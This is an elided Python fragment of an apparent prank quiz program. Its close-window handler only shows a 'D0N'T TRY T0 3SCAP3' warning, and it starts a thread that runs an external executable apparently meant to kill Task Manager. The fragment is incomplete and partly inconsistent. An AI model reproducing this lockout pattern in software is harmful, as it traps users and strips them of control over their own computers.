...
import threading
import subprocess
from incorrect import *

def on_closing():
    showwarning(title='3RR0R!', message="D0N'T TRY T0 3SCAP3")

def takmgr_kill():
    subprocess.run("taskmgr_kill.exe")

thread = threading.Thread(target=takmgr_kill)
thread.start()
...
def btn_hal():
    if questions[current_question-1][-1]=='l':
        ...
        correct = Label(main, image=bigger_incorrect_img)
        correct.place(rely=.55, relx=.5, anchor=CENTER)
...
bigger_incorrect_img = incorrect_img.zoom(2,2)
